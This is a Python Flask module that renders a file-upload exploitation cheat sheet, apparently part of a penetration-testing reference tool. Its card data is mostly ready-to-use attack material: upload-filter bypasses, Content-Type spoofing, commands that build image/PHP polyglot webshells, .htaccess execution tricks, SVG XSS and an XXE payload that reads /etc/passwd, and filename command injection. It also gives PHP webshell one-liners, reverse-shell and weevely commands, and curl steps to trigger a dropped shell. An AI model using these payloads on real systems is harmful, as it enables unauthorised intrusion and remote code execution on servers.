from flask import Blueprint, render_template

bp = Blueprint("fileupload", __name__)

CARDS = [
    {"title": "Extension bypasses", "hint": "When the server blocklists .php etc. Try alternates the interpreter still runs.", "blocks": [
        {"tpl": "shell.phtml / .php3 / .php4 / .php5 / .php7 / .pht / .phar", "plain": True, "lbl": "PHP alternate extensions"},
        {"tpl": "shell.pHp / shell.PHP", "plain": True, "lbl": "case variation"},
        {"tpl": "shell.php.jpg / shell.jpg.php", "plain": True, "lbl": "double extension"},
        {"tpl": "shell.php%00.jpg", "plain": True, "lbl": "null byte (old PHP < 5.3.4)"},
        {"tpl": "shell.php.", "plain": True, "lbl": "trailing dot / space (Windows)"},
        {"tpl": "shell.asp;.jpg  |  shell.aspx / .asa / .cer", "plain": True, "lbl": "IIS / ASP variants"},
        {"tpl": "shell.jsp / .jspx / .jsw / .jsv / .jspf", "plain": True, "lbl": "Java / Tomcat"},
    ]},
    {"title": "Content-Type (MIME) bypass", "hint": "Change the Content-Type header of the upload part to a whitelisted type.", "blocks": [
        {"tpl": "Content-Type: image/png", "plain": True, "lbl": "spoof as image while body stays PHP"},
        {"tpl": "Content-Type: image/jpeg", "plain": True},
        {"tpl": "# in Burp: keep filename shell.php, flip the part's Content-Type to image/png", "plain": True},
    ]},
    {"title": "Magic-byte / content bypass", "hint": "When the server checks file signature or uses getimagesize().", "blocks": [
        {"tpl": "printf '\\x89PNG\\r\\n\\x1a\\n' > shell.php && echo '<?php system($_GET[0]); ?>' >> shell.php", "lbl": "prepend PNG magic bytes"},
        {"tpl": "printf 'GIF89a;' > shell.php && echo '<?php system($_GET[0]); ?>' >> shell.php", "lbl": "GIF header trick"},
        {"tpl": "exiftool -Comment='<?php system($_GET[0]); ?>' real.jpg -o shell.php.jpg", "lbl": "hide payload in EXIF"},
        {"tpl": "# polyglot: valid image + valid PHP in one file", "plain": True},
    ]},
    {"title": "Config-file upload (no direct exec needed)", "hint": "Upload a config that makes the server execute your image as code.", "blocks": [
        {"tpl": "AddType application/x-httpd-php .jpg", "plain": True, "lbl": ".htaccess (Apache) -> run .jpg as PHP"},
        {"tpl": "# then upload shell.jpg containing PHP", "plain": True},
        {"tpl": "web.config with <handlers> mapping -> ASP exec (IIS)", "plain": True},
    ]},
    {"title": "Filename injection", "hint": "The filename itself is the payload.", "blocks": [
        {"tpl": "../../../../var/www/html/shell.php", "plain": True, "lbl": "path traversal — write outside upload dir"},
        {"tpl": "shell.php%00.png / shell%2ephp", "plain": True, "lbl": "null-byte / encoding"},
        {"tpl": "'><svg onload=alert(1)>.png", "plain": True, "lbl": "stored XSS via filename"},
        {"tpl": "$(id).jpg  |  ;id;.jpg", "plain": True, "lbl": "command injection if filename is shell-processed"},
    ]},
    {"title": "Image-parser / SVG attacks", "blocks": [
        {"tpl": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>", "lbl": "SVG stored XSS"},
        {"tpl": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>", "lbl": "SVG -> XXE (see XML tab)"},
        {"tpl": "# ImageMagick 'ImageTragick' (CVE-2016-3714) if it processes uploads", "plain": True},
    ]},
    {"title": "Webshells to drop", "hint": "Minimal PHP; catch with a proper shell after (see Reverse shells / Listeners).", "blocks": [
        {"tpl": "<?php system($_GET['c']); ?>", "lbl": "one-liner (call ?c=id)"},
        {"tpl": "<?php echo shell_exec($_REQUEST['cmd']); ?>", "plain": True},
        {"tpl": "cp /usr/share/webshells/php/php-reverse-shell.php shell.php", "lbl": "pentestmonkey revshell (edit LHOST/LPORT)"},
        {"tpl": "weevely generate $PASS shell.php", "lbl": "weevely stealth shell"},
        {"tpl": "weevely http://$RHOST:$RPORT/uploads/shell.php $PASS", "lbl": "weevely connect"},
    ]},
    {"title": "Find where it landed & trigger", "blocks": [
        {"tpl": "ffuf -u http://$RHOST:$RPORT/FUZZ/shell.php -w $WORDLIST", "lbl": "find the upload dir"},
        {"tpl": "curl 'http://$RHOST:$RPORT/uploads/shell.php?c=id'", "lbl": "execute"},
        {"tpl": "# common dirs: /uploads /files /images /media /avatars /tmp", "plain": True},
    ]},
]


@bp.route("/fileupload")
def index():
    return render_template("cheat.html", active="fileupload",
                           title="File Upload", tag="exploitation",
                           intro="Bypass upload filters (extension, MIME, magic bytes, config-file tricks) and land a webshell, then find and trigger it.",
                           cards=CARDS)


MODULE = {"id": "fileupload", "title": "File Upload", "category": "Exploitation",
          "order": 6, "blueprint": bp, "endpoint": "fileupload.index"}
